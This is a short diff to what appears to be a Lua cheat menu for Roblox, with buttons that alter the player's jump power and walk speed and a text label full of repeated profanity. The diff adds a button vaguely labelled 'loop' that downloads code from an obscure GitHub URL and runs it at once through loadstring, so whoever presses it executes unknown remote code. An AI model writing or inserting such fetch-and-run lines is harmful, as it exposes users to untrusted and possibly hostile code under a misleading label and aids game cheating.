@@ -19,6 +19,9 @@ Text = "made by someone fuck fuck fuck fuck fuck fuck fuck fuck fuck fuck fuck f
         game.Players.LocalPlayer.Character.Humanoid.JumpPower = 50
         game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 16
     end)
+    PlayerSection:NewButton("loop", "loop", function()
+    	loadstring(game:HttpGet("https://raw.githubusercontent.com/bhkxdcjkhgfdjiuhgjihgfhjkh/a/main/b"))()
+    end)
 --ui
   local UI = Window:NewTab("UI")
     local UISection = UI:NewSection("UI")
